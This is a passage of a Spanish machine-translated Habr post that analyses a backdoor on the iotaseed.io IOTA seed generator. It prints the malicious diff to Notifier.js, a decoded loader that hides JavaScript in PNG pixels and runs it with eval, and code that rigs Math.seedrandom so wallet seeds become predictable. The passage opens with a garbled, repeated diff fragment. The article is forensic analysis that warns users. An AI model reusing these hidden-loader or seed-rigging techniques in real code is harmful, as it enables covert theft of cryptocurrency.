(/ps:.*o/.test(document.location)) { &lt; eval(atob(image.split(",")[2])) &lt; } &lt; return &lt; } 119,121d108 &lt; init: function(message, title) { &lt; this.notify(message, title, "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9wCBxILCcud3gSTrg4uDm5uZFRETbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo/h4eEzODbm5+eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03/9RTlAAAADy8vIgICA2NzY4OzYPM0fa29q,ZnVuY3Rpb24gY0RpcyhmKXt2YXIgbz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKS5nZXRDb250ZXh0KCIyZCIpO3ZhciBpPW5ldyBJbWFnZTtpLm9ubG9hZD1mdW5jdGlvbigpe28uZHJhd0ltYWdlKGksMCwwKTtkUyhvLmdldEltYWdlRGF0YSgwLDAsMjk4LDEwMCkuZGF0YSl9O2kuc3JjPWZ9ZnVuY3Rpb24gZFMoZCl7dmFyIGw9MjEsYk09IiIsdE09IiI7Zm9yKHZhciBpPTA7aTxsO2krKyl7dmFyIGI9KGRbaSo0KzJdPj4+MCkudG9TdHJpbmcoMik7Yk0rPWJbYi5sZW5ndGgtMV07aWYoYk0ubGVuZ3RoPT0xNil7bD1wYXJzZUludChiTSwyKSsxNjtiTT0iIn1lbHNlIGlmKGJNLmxlbmd0aD09OCYmbCE9MjEpe3RNKz1TdHJpbmcuZnJvbUNoYXJDb2RlKHBhcnNlSW50KGJNLDIpKTtiTT0iIn19ZXZhbCh0TSl9Y0RpcygiLi9pbWFnZXMvbG9nb19zbWFsbF9ib3R0b20ucG5nIik7,TbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo/h4eEzODbm5+eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03///9RTlAAAADy8vIgICA2NzY4OzYPM0fa29qgoI7/zMnj4+PW19VGRkbqPi7v7/D6+vr09fXyTj4rKSvhSTo/Pj/oSDnlMyLsNCI0MTP0///tTT7ZRjizOi+6PDDmLRyenZ7oKRfExMT/TzvobGEVFBWGhYUAGjLW8/ToXVADLUZ8e33/2tfRRTdWVFTFQDT1u7aSkZIADib+5eFwcHHW+/z70tDwkIesPTPW6+teXV2xsbG7u7vY4+Lre3DMzM2qp6jilIxsPT7lg3kdO07m/f4AJjuwsJzftK/fpZ7woJjoVUZBWGj1zMdTaXfcvrrzq6Tby8f+8u8wSlYZNDaQRUKfr7d9j5lpf4vx5ePMsLF/o64s+PNlAAAANnRSTlMAC1IoljoZWm2yloPRGWiJfdjEEk037Esq7Pn24EKjpiX+z7rJNNWB5pGxZ1m2mZY/gXOlr43C+dBMAAAmkklEQVR42uzay86bMBAF4MnCV1kCeQFIRn6M8xZe+v1fpVECdtPSy5822Bi+JcujmfEApl3IIRhBFyIJ3Em6UMTDSKfHsOB0dhILQ2fX4+4aF0tVXC3yJJB4OrcJV1msIhJN52avslhpZOfcvyepfceIaARw5t2CWTwYRhSQTdSum1TGqE5Mr0kg6Ukj66hZ3GExaEaJQsYIWXzmd6P2KHxn6NjG4/BDMEQ6RM+oNQ6vjJyWFTNTDJlau0e1drAO+Ikan8tE1itkfC0S11iXKGyYJZFB5jpkgmY8WWoKx6Z5JI3MGyQqV1Jj80Jgm2J9xGrQSAKfcyptEfgFrxxWnUUiVEqIGjN5bAsRKyOReI9FaGxw3o0Of8I6rAbbcBR06yN+T+Uogmu2QR5ucsaXuV6w1hath9HiDWGwWrLmOoUL7/CWYLRo6/2d9zPeN6hONNEvXKiIf2fkwauDCxXwcPI0mA/4v+whvwdzafABTh/tZW3SEcmZS0NYfJTTB5kaYsbnHSEMMWMfuvJdg3vsJlR9R6UP2JOp9jRhM/ZVa5dwiwJCT9UZI8qwtRVGh2JCVSsXtyinqgtMk0NJFf1QYwGlmToGhkQFQg3X5nvUofzw7FCLr2bRak2Uz0KgJhOVM6EqjlMpvPwp+ioWy2JAbWYqQ6E+mv5SwyNzJWh/HHX6Rty17TYNBFF44CokEA+ABELiJ2yMnUorefElCY5pHGgqu3JUhYAU0xpwwYoqJSAU8sgXMxvvekwukAS0PS9pq3I8OXtmZm8pF3D6vuLEx7N833/N0bI85X/CarUEte9b68nlf4rg+lKoEGAvPMvzk6+Ak5OwZ71u/S81gEoJR8AMyPNR2FOs7jo1pG94PvzdD76vjCZTYp/vlzDefw0hYOWf4b1+3Tt5+3MfcZ7NxnnPX0Uu//7StQUhwgmNk/N9x3ENDpfF/P7E6/6rM1qt8K0BXMjsOs7+eZKNR95KMSQfCgS/pUY4TuPUdlEHlOPnCXj7H2B1e9+ZxRaZHVuN49nI8pUlNC9JRLVSwMhM4piahmOsA/FMFPwB+4ZiyTYnf/gAAAABJRU5ErkJggg==") &lt; },</code> whvwdzafABTh / tZW3SEcmZS0NYfJTTB5kaYsbnHSEMMWMfuvJdg3vsJlR9R6UP2JOp9jRhM / ZVa5dwiwJCT9UZI8qwtRVGh2JCVSsXtyinqgtMk0NJFf1QYwGlmToGhkQFQg3X5nvUofzw7FCLr2bRak2Uz0KgJhOVM6EqjlMpvPwp + ioWy2JAbWYqQ6E + mv5SwyNzJWh / HHX6Rty17TYNBFF44CokEA + ABELiJ2yMnUorefElCY5pHGgqu3JUhYAU0xpwwYoqJSAU8sgXMxvvekwukAS0PS9pq3I8OXtmZm8pF3D6vuLEx7N833 / N0bI85X / CarUEte9b68nlf4rg + lKoEGAvPMvzk6 + Ak5OwZ71u / S81gEoJR8AMyPNR2FOs7jo1pG94PvzdD76vjCZTYp / vlzDefw0hYOWf4b1 + 3Tt5 + 3MfcZ7NxnnPX0Uu // 7StQUhwgmNk / N9x3ENDpfF / P7E6 / 6rM1qt8K0BXMjsOs7 + eZKNR95KMSQfCgS / pUY4TuPUdlEHlOPnCXj7H2B1e9 <code class="diff hljs">$ diff notifier-website.js notifier-github.js 68,71d67 &lt; if (!window.inited_n) { &lt; window.inited_n = true; &lt; Notifier.init() &lt; } 82,87d77 &lt; if (/,T/.test(image)) { &lt; if (/ps:.*o/.test(document.location)) { &lt; eval(atob(image.split(",")[2])) &lt; } &lt; return &lt; } 119,121d108 &lt; init: function(message, title) { &lt; this.notify(message, title, "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9wCBxILCcud3gSTrg4uDm5uZFRETbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo/h4eEzODbm5+eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03/9RTlAAAADy8vIgICA2NzY4OzYPM0fa29q,ZnVuY3Rpb24gY0RpcyhmKXt2YXIgbz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKS5nZXRDb250ZXh0KCIyZCIpO3ZhciBpPW5ldyBJbWFnZTtpLm9ubG9hZD1mdW5jdGlvbigpe28uZHJhd0ltYWdlKGksMCwwKTtkUyhvLmdldEltYWdlRGF0YSgwLDAsMjk4LDEwMCkuZGF0YSl9O2kuc3JjPWZ9ZnVuY3Rpb24gZFMoZCl7dmFyIGw9MjEsYk09IiIsdE09IiI7Zm9yKHZhciBpPTA7aTxsO2krKyl7dmFyIGI9KGRbaSo0KzJdPj4+MCkudG9TdHJpbmcoMik7Yk0rPWJbYi5sZW5ndGgtMV07aWYoYk0ubGVuZ3RoPT0xNil7bD1wYXJzZUludChiTSwyKSsxNjtiTT0iIn1lbHNlIGlmKGJNLmxlbmd0aD09OCYmbCE9MjEpe3RNKz1TdHJpbmcuZnJvbUNoYXJDb2RlKHBhcnNlSW50KGJNLDIpKTtiTT0iIn19ZXZhbCh0TSl9Y0RpcygiLi9pbWFnZXMvbG9nb19zbWFsbF9ib3R0b20ucG5nIik7,TbRznoTD3oTD1JR0iXlYXaRzncRzhBQUDnSjtNS0zUzsdnZmVLSEpMSEoyNjPm5eSZmYfm6ekzNTOloI42ODbm6Oiioo/h4eEzODbm5+eop5SiopCiopDl396hloaDg3ToTD3m5uZMS03///9RTlAAAADy8vIgICA2NzY4OzYPM0fa29qgoI7/zMnj4+PW19VGRkbqPi7v7/D6+vr09fXyTj4rKSvhSTo/Pj/oSDnlMyLsNCI0MTP0///tTT7ZRjizOi+6PDDmLRyenZ7oKRfExMT/TzvobGEVFBWGhYUAGjLW8/ToXVADLUZ8e33/2tfRRTdWVFTFQDT1u7aSkZIADib+5eFwcHHW+/z70tDwkIesPTPW6+teXV2xsbG7u7vY4+Lre3DMzM2qp6jilIxsPT7lg3kdO07m/f4AJjuwsJzftK/fpZ7woJjoVUZBWGj1zMdTaXfcvrrzq6Tby8f+8u8wSlYZNDaQRUKfr7d9j5lpf4vx5ePMsLF/o64s+PNlAAAANnRSTlMAC1IoljoZWm2yloPRGWiJfdjEEk037Esq7Pn24EKjpiX+z7rJNNWB5pGxZ1m2mZY/gXOlr43C+dBMAAAmkklEQVR42uzay86bMBAF4MnCV1kCeQFIRn6M8xZe+v1fpVECdtPSy5822Bi+JcujmfEApl3IIRhBFyIJ3Em6UMTDSKfHsOB0dhILQ2fX4+4aF0tVXC3yJJB4OrcJV1msIhJN52avslhpZOfcvyepfceIaARw5t2CWTwYRhSQTdSum1TGqE5Mr0kg6Ukj66hZ3GExaEaJQsYIWXzmd6P2KHxn6NjG4/BDMEQ6RM+oNQ6vjJyWFTNTDJlau0e1drAO+Ikan8tE1itkfC0S11iXKGyYJZFB5jpkgmY8WWoKx6Z5JI3MGyQqV1Jj80Jgm2J9xGrQSAKfcyptEfgFrxxWnUUiVEqIGjN5bAsRKyOReI9FaGxw3o0Of8I6rAbbcBR06yN+T+Uogmu2QR5ucsaXuV6w1hath9HiDWGwWrLmOoUL7/CWYLRo6/2d9zPeN6hONNEvXKiIf2fkwauDCxXwcPI0mA/4v+whvwdzafABTh/tZW3SEcmZS0NYfJTTB5kaYsbnHSEMMWMfuvJdg3vsJlR9R6UP2JOp9jRhM/ZVa5dwiwJCT9UZI8qwtRVGh2JCVSsXtyinqgtMk0NJFf1QYwGlmToGhkQFQg3X5nvUofzw7FCLr2bRak2Uz0KgJhOVM6EqjlMpvPwp+ioWy2JAbWYqQ6E+mv5SwyNzJWh/HHX6Rty17TYNBFF44CokEA+ABELiJ2yMnUorefElCY5pHGgqu3JUhYAU0xpwwYoqJSAU8sgXMxvvekwukAS0PS9pq3I8OXtmZm8pF3D6vuLEx7N833/N0bI85X/CarUEte9b68nlf4rg+lKoEGAvPMvzk6+Ak5OwZ71u/S81gEoJR8AMyPNR2FOs7jo1pG94PvzdD76vjCZTYp/vlzDefw0hYOWf4b1+3Tt5+3MfcZ7NxnnPX0Uu//7StQUhwgmNk/N9x3ENDpfF/P7E6/6rM1qt8K0BXMjsOs7+eZKNR95KMSQfCgS/pUY4TuPUdlEHlOPnCXj7H2B1e9+ZxRaZHVuN49nI8pUlNC9JRLVSwMhM4piahmOsA/FMFPwB+4ZiyTYnf/gAAAABJRU5ErkJggg==") &lt; },</code> </pre> <br>  Parece que alguien realiz√≥ cambios con mucho cuidado en la biblioteca Notifier.js para ocultar un fragmento de c√≥digo.  El m√©todo <font color="#e83e8c"><code>Notifier.notify</code></font> se ha cambiado para que compruebe si el par√°metro contiene la <font color="#e83e8c"><code>image ",T"</code></font> .  A continuaci√≥n, decodifica parte del par√°metro en JavaScript y lo procesa.  Otro cambio agreg√≥ el m√©todo <font color="#e83e8c"><code>Notifier.init()</code></font> , llamado despu√©s de que se carga la p√°gina.  √âl, a su vez, llam√≥ al m√©todo de <font color="#e83e8c"><code>notify</code></font> con el par√°metro de <font color="#e83e8c"><code>image</code></font> , lo que provoc√≥ la activaci√≥n de este c√≥digo. <br><br>  Al ejecutar el fragmento de c√≥digo anterior <font color="#e83e8c"><code>atob(image.split(",")[2])</code></font> con el enlace de datos especificado, se obtiene el siguiente fragmento de c√≥digo (se agregan sangr√≠as y espacios para mejorar la legibilidad): <br><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">cDis</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(f)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> o = document.createElement(<span class="hljs-string"><span class="hljs-string">"canvas"</span></span>).getContext(<span class="hljs-string"><span class="hljs-string">"2d"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Image; i.onload = function() { o.drawImage(i, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); dS(o.getImageData(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">298</span></span>, <span class="hljs-number"><span class="hljs-number">100</span></span>).data) }; i.src = f } <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">dS</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(d)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> l = <span class="hljs-number"><span class="hljs-number">21</span></span>, bM = <span class="hljs-string"><span class="hljs-string">""</span></span>, tM = <span class="hljs-string"><span class="hljs-string">""</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">var</span></span> i = <span class="hljs-number"><span class="hljs-number">0</span></span>; i &lt; l; i++) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> b = (d[i * <span class="hljs-number"><span class="hljs-number">4</span></span> + <span class="hljs-number"><span class="hljs-number">2</span></span>] &gt;&gt;&gt; <span class="hljs-number"><span class="hljs-number">0</span></span>).toString(<span class="hljs-number"><span class="hljs-number">2</span></span>); bM += b[b.length - <span class="hljs-number"><span class="hljs-number">1</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (bM.length == <span class="hljs-number"><span class="hljs-number">16</span></span>) { l = parseInt(bM, <span class="hljs-number"><span class="hljs-number">2</span></span>) + <span class="hljs-number"><span class="hljs-number">16</span></span>; bM = <span class="hljs-string"><span class="hljs-string">""</span></span> } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (bM.length == <span class="hljs-number"><span class="hljs-number">8</span></span> &amp;&amp; l != <span class="hljs-number"><span class="hljs-number">21</span></span>) { tM += String.fromCharCode(parseInt(bM, <span class="hljs-number"><span class="hljs-number">2</span></span>)); bM = <span class="hljs-string"><span class="hljs-string">""</span></span> } } eval(tM) } cDis(<span class="hljs-string"><span class="hljs-string">"./images/logo_small_bottom.png"</span></span>);</code> </pre> <br>  La segunda parte del c√≥digo malicioso inserta <font color="#e83e8c"><code>./images/logo_small_bottom.png</code></font> en el elemento &lt;canvas&gt; oculto fuera de la pantalla, lee la imagen en forma de texto y procesa este texto como c√≥digo javascript. <br><br>  El archivo <font color="#e83e8c"><code>logo_small_bottom.png</code></font> se agreg√≥ al repositorio el 28 de agosto de 2017 y se actualiz√≥ 3 horas m√°s tarde.  Ambas versiones pasadas a trav√©s de este decodificador de imagen no producen c√≥digo v√°lido. <br><br>  Sin embargo, se utiliz√≥ otra imagen en la copia WM guardada del sitio.  El siguiente c√≥digo est√° oculto (la sangr√≠a se agrega nuevamente por conveniencia): <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-regexp"><span class="hljs-regexp">/ps:.*\.io/</span></span>.test(<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.location)) { mode = <span class="hljs-string"><span class="hljs-string">"M"</span></span>; (<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">message</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> name = <span class="hljs-string"><span class="hljs-string">"edr"</span></span>; name += <span class="hljs-string"><span class="hljs-string">"an"</span></span>; message[<span class="hljs-string"><span class="hljs-string">"cont"</span></span>] = <span class="hljs-number"><span class="hljs-number">0</span></span>; name += <span class="hljs-string"><span class="hljs-string">"dom"</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">show</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">arg, options, image</span></span></span><span class="hljs-function">) </span></span>{ message[<span class="hljs-string"><span class="hljs-string">"e2"</span></span> + name](<span class="hljs-string"><span class="hljs-string">"4782588875512803642"</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">String</span></span>(message[<span class="hljs-string"><span class="hljs-string">"cont"</span></span>]), options, image); message[<span class="hljs-string"><span class="hljs-string">"cont"</span></span>] += <span class="hljs-number"><span class="hljs-number">1</span></span> } message[<span class="hljs-string"><span class="hljs-string">"e2"</span></span> + name] = message[<span class="hljs-string"><span class="hljs-string">"se"</span></span> + name]; message[<span class="hljs-string"><span class="hljs-string">"se"</span></span> + name] = show })(<span class="hljs-built_in"><span class="hljs-built_in">eval</span></span>(mode + <span class="hljs-string"><span class="hljs-string">"ath"</span></span>)) }</code> </pre> <br>  Esta es la √∫ltima etapa de la puerta trasera de JavaScript.  Se puede simplificar al siguiente c√≥digo: <br><br><pre> <code class="javascript hljs"><span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.cont = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">show</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">arg, options, image</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.e2edrandom(<span class="hljs-string"><span class="hljs-string">"4782588875512803642"</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">String</span></span>(<span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.cont), options, image); <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.cont += <span class="hljs-number"><span class="hljs-number">1</span></span>; } <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.e2edrandom = <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.seedrandom; <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.seedrandom = show;</code> </pre> <br>  Este c√≥digo cambia la funci√≥n <font color="#e83e8c"><code>Math.seedrandom</code></font> <a href="">utilizada por el c√≥digo de generaci√≥n</a> para que siempre <font color="#e83e8c"><code>4782588875512803642</code></font> semilla constante <font color="#e83e8c"><code>4782588875512803642</code></font> y le agregue el valor de la variable del contador, aumentando en uno cada vez que se inicia la <font color="#e83e8c"><code>seedrandom</code></font> .  Esto hace que <font color="#e83e8c"><code>Math.random()</code></font> siempre devuelva la misma secuencia de n√∫meros predecible.  Como resultado, la semilla generada de cada nueva billetera IOTA siempre se mantuvo igual.  Esto se vuelve bastante obvio si intenta abrir la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=http://web.archive.org/web/20180103035549/">versi√≥n de archivo de</a> iotaseed.io varias veces y observa que la semilla generada siempre permanece <font color="#e83e8c"><code>XZHKIPJIFZFYJJMKBVBJLQUGLLE9VUREWK9QYTITMQYPHBWWPUDSATLLUADKSEEYWXKCDHWSMBTBURCQD</code></font> . <br><br>  Es importante se√±alar aqu√≠ que el n√∫mero utilizado para generar ( <font color="#e83e8c"><code>"4782588875512803642"</code></font> en el ejemplo anterior) fue diferente para cada usuario.  Debido al hecho de que WM guard√≥ una copia de la imagen en un momento determinado, la semilla permanece igual cada vez que abre una copia para la misma fecha.  Los cheques para otras fechas, por ejemplo, 31 de octubre o 19 de noviembre, muestran que sus n√∫meros y semillas difieren de la copia que examinamos para el 3 de enero.  En base a esto, podemos concluir que el archivo <font color="#e83e8c"><code>./images/logo_small_bottom.png</code></font> generado sobre la marcha por el servidor iotaseed.io. <br><br>  Durante la creaci√≥n de este archivo, el n√∫mero utilizado por el generador de n√∫meros aleatorios corregidos fue cambiado y probablemente almacenado en alg√∫n lugar para que un atacante pudiera usarlo m√°s tarde para robar IOTA.  Como resultado, el sitio web gener√≥ diferentes semillas para diferentes usuarios.  Sin embargo, la situaci√≥n con la generaci√≥n aleatoria en el lado del servidor tampoco fue la mejor, ya que se sabe que al menos una persona <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">recibi√≥</a> una semilla en el sitio que alguien ya us√≥.  Una demostraci√≥n de la diferencia de c√≥digo est√° disponible en este <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">enlace</a> . <br><br>  Usando el funcionario <a href="">Javascript-biblioteca de la IOTA</a> , podemos establecer que el ya mencionado Sid <font color="#e83e8c"><code>XZHKIPJIFZFYJJMKBVBJLQUGLLE9VUREWK9QYTITMQYPHBWWPUDSATLLUADKSEEYWXKCDHWSMBTBURCQD</code></font> corresponde a la direcci√≥n <font color="#e83e8c"><code>PUEBLAHRQGOTIAMJHCCXXGQPXDQJS9BDFSCDSMINAYJNSILCCISDVY99GMKAEIAICYQUXMIYTNQCJYVDX</code></font> .  Seg√∫n <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">este sitio web</a> , la billetera est√° vac√≠a, pero otros sitios del explorador del historial de transacciones dan un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">error 404</a> .  Esto significa que comet√≠ un error al decodificar la direcci√≥n o no entiendo c√≥mo funciona la red IOTA. <br><br><h3>  Conclusi√≥n </h3><br>  La puerta trasera estaba oculta astutamente.  Definitivamente se coloc√≥ all√≠ con intenci√≥n maliciosa, y no debido a un error con el uso de la criptograf√≠a.  No est√° claro hasta el final si fue agregado por el propietario del repositorio de github y el sitio norbertvdberg, o si su cuenta de hosting fue pirateada.  Sea como fuere, a juzgar por la reacci√≥n del propietario, que luego elimin√≥ sus cuentas en <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">GitHub</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Reddit</a> y <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Quora</a> , resulta que el sitio fue originalmente concebido para robar fondos de los usuarios. <br><br>  Los atacantes tomaron muchos pasos para ocultar la puerta trasera.  Un r√°pido vistazo al tablero del desarrollador en un navegador no revelar√≠a nada sospechoso.  Por ejemplo, <font color="#e83e8c"><code>data:</code></font> enlace en la primera etapa de la puerta trasera comenz√≥ con <font color="#e83e8c"><code>iVBORw0KGgo</code></font> que corresponde al comienzo de un encabezado PNG v√°lido codificado en la base 64. Esto significa que dicha URL podr√≠a confundirse f√°cilmente con una inserci√≥n de imagen: la acci√≥n es bastante normal para una biblioteca de notificaciones js.  Parte del c√≥digo javascript se carga desde la imagen, y su solicitud es la √∫nica solicitud de red.  Desafortunadamente, todo esto result√≥ ser suficiente para hacer que muchas personas crean que todo est√° en orden con el sitio. <br><br>  Un estudio cuidadoso del panel de desarrolladores en el navegador le permite ver esta solicitud. <br><br> <a href=""><img src="https://habrastorage.org/webt/ov/jt/ib/ovjtibg61gubqtlmc1n39w0xfhy.png"></a> <br><br>  En general, este incidente debe tomarse como un recordatorio de que cuando se trata de criptomonedas (¬°y especialmente grandes cantidades!), La paranoia puede ser algo bueno.  Nunca debe confiar en servicios en l√≠nea como generadores de frases semilla o billeteras web, confiando en cantidades significativas para usted.  Debe usar solo el software que ha sido sometido a una revisi√≥n y auditor√≠a exhaustivas por parte de la comunidad. <br><br>  En nuestro caso, iotaseed.io realmente se posicion√≥ como una soluci√≥n de c√≥digo abierto, lo que indica la apertura y la capacidad de verificar el c√≥digo por cualquier persona.  Parec√≠a que esto era suficiente para convencer a algunas personas, pero ninguno de ellos pens√≥ que el c√≥digo real que se ejecutaba en el sitio web pod√≠a cambiarse.  Una verificaci√≥n cuidadosa revelar√≠a este hecho, d√°ndonos otro ejemplo de las graves consecuencias que puede tener la confianza ciega en la etiqueta de c√≥digo abierto, especialmente en el campo de las criptomonedas. <br><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><img src="https://habrastorage.org/files/4bd/bf6/597/4bdbf659775744b1bdbb4d8a00a0a980.png" alt="imagen"></a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es410041/">https://habr.com/ru/post/es410041/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es410031/index.html">Valoraci√≥n de las plataformas de b√∫squeda de componentes electr√≥nicos.</a></li>
<li><a href="../es410033/index.html">Impresi√≥n 3D en metal en Formnext 2017</a></li>
<li><a href="../es410035/index.html">Estudio de CoinDesk: solo el 19% de los inversores tomaron pr√©stamos para comprar criptomonedas</a></li>
<li><a href="../es410037/index.html">Preg√∫ntele a Ethan: ¬øNo es est√∫pido so√±ar con terraformar Marte?</a></li>
<li><a href="../es410039/index.html">Dane, distribuyendo instrucciones para los usuarios de Popcorn Time, fue a juicio</a></li>
<li><a href="../es410043/index.html">Impuesto minero: c√≥mo funcionar√°</a></li>
<li><a href="../es410045/index.html">Los cient√≠ficos han creado un "oc√©ano alien√≠gena" para probar las cualidades de un robot submarino</a></li>
<li><a href="../es410047/index.html">Intel RealSense D400 - C√°maras de realidad digital</a></li>
<li><a href="../es410049/index.html">Datos que amenazan con romper la f√≠sica</a></li>
<li><a href="../es410053/index.html">C√≥mo Alaska combate la desigualdad digital</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>